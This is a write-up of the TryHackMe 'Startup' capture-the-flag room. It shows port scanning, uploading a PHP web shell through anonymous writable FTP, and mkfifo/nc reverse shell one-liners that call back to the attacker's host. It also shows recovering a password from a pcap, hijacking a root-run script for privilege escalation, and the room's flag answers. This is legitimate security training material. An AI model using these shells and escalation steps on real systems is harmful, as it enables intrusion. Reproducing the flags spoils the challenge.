## Startup - TryHackMe Writeup

[Room Link](https://tryhackme.com/room/startup)

<i>We are Spice Hut, a new startup company that just made it big! We offer a variety of spices and club sandwiches (in case you get hungry), but that is not why you are here. 
To be truthful, we aren't sure if our developers know what they are doing and our security concerns are rising. 
We ask that you perform a thorough penetration test and try to own root. Good luck!</i>

**IP: 10.10.72.19**

**Replace [YOUR-THM-IP] with your own machine IP assigned by TryHackMe.**

---

## 📌 General Information

**Room Difficulty**: Easy  <br>

**Room Type**: Linux Privilege Escalation, Web, <br>

**Tools Used**: Nmap, Ffuf, Wireshark<br>

**Author**: <br>

[<img align='center' src="https://github.com/mauzware/mauzware/blob/main/LOGO%20NEW.png"/>](https://github.com/mauzware)

[TryHackMe Profile](https://tryhackme.com/p/mauzinho) <br>
[GitHub Profile](https://github.com/mauzware)

---

## 🔍 Enumeration

- Starting enumeration with Nmap scan and Ffuf.

  ```
  nmap -sC -sV -T5 -p- 10.10.72.19
  PORT      STATE    SERVICE    VERSION
  21/tcp    open     ftp        vsftpd 3.0.3
  | ftp-syst: 
  |   STAT: 
  | FTP server status:
  |      Connected to 
  |      Logged in as ftp
  |      TYPE: ASCII
  |      No session bandwidth limit
  |      Session timeout in seconds is 300
  |      Control connection is plain text
  |      Data connections will be plain text
  |      At session startup, client count was 2
  |      vsFTPd 3.0.3 - secure, fast, stable
  |_End of status
  | ftp-anon: Anonymous FTP login allowed (FTP code 230)
  | drwxrwxrwx    2 65534    65534        4096 Nov 12  2020 ftp [NSE: writeable]
  | -rw-r--r--    1 0        0          251631 Nov 12  2020 important.jpg
  |_-rw-r--r--    1 0        0             208 Nov 12  2020 notice.txt
  22/tcp    open     ssh        OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
  | ssh-hostkey: 
  |   2048 b9:a6:0b:84:1d:22:01:a4:01:30:48:43:61:2b:ab:94 (RSA)
  |   256 ec:13:25:8c:18:20:36:e6:ce:91:0e:16:26:eb:a2:be (ECDSA)
  |_  256 a2:ff:2a:72:81:aa:a2:9f:55:a4:dc:92:23:e6:b4:3f (ED25519)
  80/tcp    open     http       Apache httpd 2.4.18 ((Ubuntu))
  |_http-server-header: Apache/2.4.18 (Ubuntu)
  |_http-title: Maintenance
  5270/tcp  filtered xmp
  20999/tcp filtered athand-mmp
  21710/tcp filtered unknown
  28914/tcp filtered unknown
  36409/tcp filtered unknown
  37728/tcp filtered unknown
  39377/tcp filtered unknown
  44554/tcp filtered unknown
  47697/tcp filtered unknown
  56654/tcp filtered unknown
  58999/tcp filtered unknown
  63491/tcp filtered unknown
  64434/tcp filtered unknown
  Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
  ```

  ```
  ffuf -u http://10.10.72.19/FUZZ -w /usr/share/wordlists/dirb/common.txt 
  .hta                    [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 4328ms]
  .htaccess               [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 4328ms]
  .htpasswd               [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 4328ms]
  files                   [Status: 301, Size: 310, Words: 20, Lines: 10, Duration: 48ms]
  index.html              [Status: 200, Size: 808, Words: 136, Lines: 21, Duration: 48ms]
  server-status           [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 188ms]
  :: Progress: [4614/4614] :: Job [1/1] :: 847 req/sec :: Duration: [0:00:09] :: Errors: 0 ::
  ```
  
- I immediately checked FTP since allows Anonymous login. There I found 2 files and downloaded them and check them both.

  ```
  ftp 10.10.72.19

  230 Login successful.
  Remote system type is UNIX.
  Using binary mode to transfer files.
  ftp> pwd
  Remote directory: /
  ftp> ls
  229 Entering Extended Passive Mode (|||51400|)
  150 Here comes the directory listing.
  drwxrwxrwx    2 65534    65534        4096 Nov 12  2020 ftp
  -rw-r--r--    1 0        0          251631 Nov 12  2020 important.jpg
  -rw-r--r--    1 0        0             208 Nov 12  2020 notice.txt
  226 Directory send OK.
  ftp> get notice.txt
  local: notice.txt remote: notice.txt
  229 Entering Extended Passive Mode (|||52839|)
  150 Opening BINARY mode data connection for notice.txt (208 bytes).
  100% |************************************************************************|   208        4.13 MiB/s    00:00 ETA
  226 Transfer complete.
  208 bytes received in 00:00 (4.20 KiB/s)
  ftp> get important.jpg
  local: important.jpg remote: important.jpg
  229 Entering Extended Passive Mode (|||60948|)
  150 Opening BINARY mode data connection for important.jpg (251631 bytes).
  100% |************************************************************************|   245 KiB    1.23 MiB/s    00:00 ETA
  226 Transfer complete.
  251631 bytes received in 00:00 (0.98 MiB/s)
  ftp> cd ftp
  250 Directory successfully changed.
  ftp> ls
  229 Entering Extended Passive Mode (|||30839|)
  150 Here comes the directory listing.
  226 Directory send OK.
  ftp> exit
  221 Goodbye.
               
  cat notice.txt  
  Whoever is leaving these damn Among Us memes in this share, it IS NOT FUNNY. 
  People downloading documents from our website will think we are a joke! 
  Now I dont know who it is, but Maya is looking pretty sus.
  ```
  
- I also used `binwalk` on this goated meme but it was a dead end. When I checked `http://10.10.72.19/files/`, I realised that that's actually FTP directory. Well, let's put web shell there so we can get command injection on web page.

  ```
  ftp> put web.php
  local: web.php remote: web.php
  229 Entering Extended Passive Mode (|||11763|)
  150 Ok to send data.
  100% |************************************************************************|  2352       43.98 MiB/s    00:00 ETA
  226 Transfer complete.
  2352 bytes sent in 00:00 (24.10 KiB/s)
  ftp> ls -al
  229 Entering Extended Passive Mode (|||54558|)
  150 Here comes the directory listing.
  drwxrwxrwx    2 65534    65534        4096 May 15 14:08 .
  drwxr-xr-x    3 65534    65534        4096 Nov 12  2020 ..
  -rwxrwxr-x    1 112      118          2352 May 15 14:08 web.php
  226 Directory send OK.
  ftp>
  ```

- Web shell can be found [here](https://github.com/artyuum/simple-php-web-shell). I changed it's name to `web.php` and in order to move it to target machine, you must have it in the same directory from which you logged in with FTP.
  After moving the shell to target machine, visit it on web page and you will have option to execute commands. `http://10.10.72.19/files/ftp/web.php`.

---

## ⚙️ Shell Access

- Here I tried few different shells and this is the one that worked for me, start a listener before you execute it.

  ```
  rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc [YOUR-THM-IP] 4444 >/tmp/f 

  nc -lvnp 4444                   
  listening on [any] 4444 ...
  connect to [YOUR-THM-IP] from (UNKNOWN) [10.10.72.19] 35282
  /bin/sh: 0: can't access tty; job control turned off
  $ whoami
  www-data
  
  python -c 'import pty;pty.spawn("/bin/bash")'
  ^Z
  stty raw -echo; fg
  export TERM=xterm
  
  www-data@startup:/var/www/html/files/ftp$ id
  uid=33(www-data) gid=33(www-data) groups=33(www-data)
  ```
  
- Changed it to putty and started looking for flags.

---

## 🧍 User Privilege Escalation

- Secret recipe ingredient I found in `/` directory.

  ```
  www-data@startup:/$ ls -al
  total 100
  drwxr-xr-x  25 root     root      4096 May 15 13:44 .
  drwxr-xr-x  25 root     root      4096 May 15 13:44 ..
  drwxr-xr-x   2 root     root      4096 Sep 25  2020 bin
  drwxr-xr-x   3 root     root      4096 Sep 25  2020 boot
  drwxr-xr-x  16 root     root      3560 May 15 13:43 dev
  drwxr-xr-x  96 root     root      4096 Nov 12  2020 etc
  drwxr-xr-x   3 root     root      4096 Nov 12  2020 home
  drwxr-xr-x   2 www-data www-data  4096 Nov 12  2020 incidents
  lrwxrwxrwx   1 root     root        33 Sep 25  2020 initrd.img -> boot/initrd.img-4.4.0-190-generic
  lrwxrwxrwx   1 root     root        33 Sep 25  2020 initrd.img.old -> boot/initrd.img-4.4.0-190-generic
  drwxr-xr-x  22 root     root      4096 Sep 25  2020 lib
  drwxr-xr-x   2 root     root      4096 Sep 25  2020 lib64
  drwx------   2 root     root     16384 Sep 25  2020 lost+found
  drwxr-xr-x   2 root     root      4096 Sep 25  2020 media
  drwxr-xr-x   2 root     root      4096 Sep 25  2020 mnt
  drwxr-xr-x   2 root     root      4096 Sep 25  2020 opt
  dr-xr-xr-x 131 root     root         0 May 15 13:43 proc
  -rw-r--r--   1 www-data www-data   136 Nov 12  2020 recipe.txt
  drwx------   4 root     root      4096 Nov 12  2020 root
  drwxr-xr-x  25 root     root       920 May 15 14:14 run
  drwxr-xr-x   2 root     root      4096 Sep 25  2020 sbin
  drwxr-xr-x   2 root     root      4096 Nov 12  2020 snap
  drwxr-xr-x   3 root     root      4096 Nov 12  2020 srv
  dr-xr-xr-x  13 root     root         0 May 15 13:43 sys
  drwxrwxrwt   7 root     root      4096 May 15 14:14 tmp
  drwxr-xr-x  10 root     root      4096 Sep 25  2020 usr
  drwxr-xr-x   2 root     root      4096 Nov 12  2020 vagrant
  drwxr-xr-x  14 root     root      4096 Nov 12  2020 var
  lrwxrwxrwx   1 root     root        30 Sep 25  2020 vmlinuz -> boot/vmlinuz-4.4.0-190-generic
  lrwxrwxrwx   1 root     root        30 Sep 25  2020 vmlinuz.old -> boot/vmlinuz-4.4.0-190-generic
  
  www-data@startup:/$ cat recipe.txt 
  Someone asked what our main ingredient to our spice soup is today. I figured I can't keep it a secret forever and told him it was love.
  ```
  
- I also found the first flag in `/home/lennie` but couldn't access it. Well, this `incidents` directory looks very suspicious so I checked it and found `.pcap` file. Downloaded it to my Kali with Python HTTP server.

  ```
  www-data@startup:/incidents$ cp suspicious.pcapng /var/www/html/files/
  cp: cannot create regular file '/var/www/html/files/suspicious.pcapng': Permission denied
  
  www-data@startup:/incidents$ python3 -m http.server 1234
  Serving HTTP on 0.0.0.0 port 1234 ...
  [YOUR-THM-IP] - - [15/May/2025 14:21:07] "GET /suspicious.pcapng HTTP/1.1" 200 -
  ^C
  Keyboard interrupt received, exiting.
  ```
  
- Now, open the `.pcap` file in Wireshark, filter HTTP traffic and you'll see info about reverse shell being uploaded on target machine. After following TCP stream on packets near the end of `pcap` file, you'll find a password.

  ```
  Sorry, try again.
  [sudo] password for www-data: 
  c4ntg3t3n0ughsp1c3
  ```

- I tried this password for user `lennie` and it actually worked. After that just read the flag.

  ```
  www-data@startup:/incidents$ su lennie
  Password: 
  lennie@startup:/incidents$
  
  lennie@startup:/incidents$ cd /home/lennie
  lennie@startup:~$ ls -la
  total 20
  drwx------ 4 lennie lennie 4096 Nov 12  2020 .
  drwxr-xr-x 3 root   root   4096 Nov 12  2020 ..
  drwxr-xr-x 2 lennie lennie 4096 Nov 12  2020 Documents
  drwxr-xr-x 2 root   root   4096 Nov 12  2020 scripts
  -rw-r--r-- 1 lennie lennie   38 Nov 12  2020 user.txt
  
  lennie@startup:~$ cat user.txt 
  THM{03ce3d619b80ccbfb3b7fc81e46c0e79}
  ```

- Now escalation.

---

## 👑 Root Privilege Escalation

- So `sudo -l`, capabilities and cronjobs returned nothing. The thing is, hint tells us how to escalate lol. In lennie's directory you can find directory `scripts` with 2 files inside, `.txt` file and an actual script.

  ```
  ennie@startup:~$ cd scripts/
  lennie@startup:~/scripts$ ls -al
  total 16
  drwxr-xr-x 2 root   root   4096 Nov 12  2020 .
  drwx------ 4 lennie lennie 4096 Nov 12  2020 ..
  -rwxr-xr-x 1 root   root     77 Nov 12  2020 planner.sh
  -rw-r--r-- 1 root   root      1 May 15 14:31 startup_list.txt
  
  lennie@startup:~/scripts$ cat startup_list.txt 
  
  lennie@startup:~/scripts$ cat planner.sh 
  #!/bin/bash
  echo $LIST > /home/lennie/scripts/startup_list.txt
  /etc/print.sh
  ```
  
- We don't have any permissions when it comes to both of these files, but the script actually executes `/etc/print.sh` which we have permissions to read and write.

  ```
  lennie@startup:~/scripts$ ls -l /etc/print.sh 
  -rwx------ 1 lennie lennie 25 Nov 12  2020 /etc/print.sh
  lennie@startup:~/scripts$ cat /etc/print.sh 
  #!/bin/bash
  echo "Done!"
  ```
  
- BINGO! Now we just upload another reverse shell, run a listener and then execute `/etc/print.sh` and we will have root access on our new connection. Let's do it!

  ```
  lennie@startup:~/scripts$ nano /etc/print.sh
  #!/bin/bash

  rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc [YOUR-THM-IP] 1234 >/tmp/f

  lennie@startup:~/scripts$ bash /etc/print.sh 
  rm: remove write-protected fifo '/tmp/f'? n
  mkfifo: cannot create fifo '/tmp/f': File exists
  /etc/print.sh: line 3: /tmp/f: Permission denied

  nc -lvnp 1234
  listening on [any] 1234 ...
  connect to [YOUR-THM-IP] from (UNKNOWN) [10.10.72.19] 45186
  /bin/sh: 0: can't access tty; job control turned off
  # whoami
  root
  # cat /root/root.txt
  THM{f963aaa6a430f210222158ae15c3d76d}
  ```

---

## 🏁 Flags

- **Secret Spice Soup Recipe**: `love`
- **User Flag**: `THM{03ce3d619b80ccbfb3b7fc81e46c0e79}`
- **Root Flag**: `THM{f963aaa6a430f210222158ae15c3d76d}`

---

## 💬 Notes & Reflections

- What was challenging in this room for me?
  `Nothing much.`

- What did I learn?
  `Just practicing my enumeration and privilege escalation skills.`

- I would recommend this room or any type of CTF challenge to every Cyber Security enthusiast since it will sharpen your skills better than any book/tutorial/course or walkthrough rooms on many different platforms!

- Thank you for reading! Enjoy, Have Fun and Happy Hacking! 🤟

---
